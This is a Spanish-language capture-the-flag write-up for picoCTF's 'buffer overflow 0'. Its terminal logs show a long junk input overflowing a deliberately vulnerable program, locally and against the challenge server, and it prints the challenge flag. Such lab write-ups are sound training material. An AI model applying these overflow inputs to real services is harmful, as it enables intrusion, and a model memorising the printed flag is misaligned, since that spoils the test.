# buffer overflow 0
#picoCTF 
## Descripción
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c). And connect with it using: `nc saturn.picoctf.net 61481`

## Pistas 
+ How can you trigger the flag to print?
+ If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
+ Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución
```bash
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ wget https://artifacts.picoctf.net/c/174/vuln                                               
--2023-05-20 20:25:15--  https://artifacts.picoctf.net/c/174/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.69, 13.249.74.22, 13.249.74.17, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[==============================================>]  15.64K  --.-KB/s    in 0.008s  

2023-05-20 20:25:16 (2.02 MB/s) - ‘vuln’ saved [16016/16016]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ wget https://artifacts.picoctf.net/c/174/vuln.c
--2023-05-20 20:25:22--  https://artifacts.picoctf.net/c/174/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.56, 13.249.74.69, 13.249.74.22, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.56|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                       100%[==============================================>]     808  --.-KB/s    in 0s      

2023-05-20 20:25:23 (13.5 MB/s) - ‘vuln.c’ saved [808/808]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ ls
vuln  vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ chmod +x vuln 
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ ./vuln          
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ nano vuln.c                
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ 
```
```bash 
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ echo 'flag{dummieflag}' > flag.txt
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ ./vuln          
Input: asdadwas
The program will exit now
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ ./vuln
Input: asdfhasdflkajshdflaskdjhfalskdfjhasldfkjhasdlfkjhsadflkajshdflaksjdhflkasjdhfklasjdhfaskldjfhaskldjfaslkdjfsalkdjfhaslkdjfsakldjfhsalkdjfhskldjfhsalkjfhsakldjfsalkdjfhskljdfhsalkdjfsakldjfhhsalkdjfhaskldjfsalkdjfaslkdjfhsalkdjfhskldfjhsalkdjfhsalkdjfhsadlkfjhsadflkjhsadflkajshdflkjsahdfkljashdfkljshadfkljsahdfklsjadhflksjdhfkljshdfklajshdflksjdhfklsjdhflksjahdfklsajdfh
flag{dummieflag}

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ nc saturn.picoctf.net 61481
Input: asdfhasdflkajshdflaskdjhfalskdfjhasldfkjhasdlfkjhsadflkajshdflaksjdhflkasjdhfklasjdhfaskldjfhaskldjfaslkdjfsalkdjfhaslkdjfsakldjfhsalkdjfhskldjfhsalkjfhsakldjfsalkdjfhskljdfhsalkdjfsakldjfhhsalkdjfhaskldjfsalkdjfaslkdjfhsalkdjfhskldfjhsalkdjfhsalkdjfhsadlkfjhsadflkjhsadflkajshdflkjsahdfkljashdfkljshadfkljsahdfklsjadhflksjdhfkljshdfklajshdflksjdhfklsjdhflksjahdfklsajdfhfsafasdfsdflkashjdfklasdjhfklasdjfhsakldfjhsdklfhjsdfasdfhasdflkajshdflaskdjhfalskdfjhasldfkjhasdlfkjhsadflkajshdflaksjdhflkasjdhfklasjdhfaskldjfhaskldjfaslkdjfsalkdjfhaslkdjfsakldjfhsalkdjfhskldjfhsalkjfhsakldjfsalkdjfhskljdfhsalkdjfsakldjfhhsalkdjfhaskldjfsalkdjfaslkdjfhsalkdjfhskldfjhsalkdjfhsalkdjfhsadlkfjhsadflkjhsadflkajshdflkjsahdfkljashdfkljshadfkljsahdfklsjadhflksjdhfkljshdfklajshdflksjdhfklsjdhflksjahdfklsajdfh
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow0]
└─$ 

```
## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}

## Notas adicionales
| comando | descripción |
|------------|---------------|
| xx | xx |

## Referencias
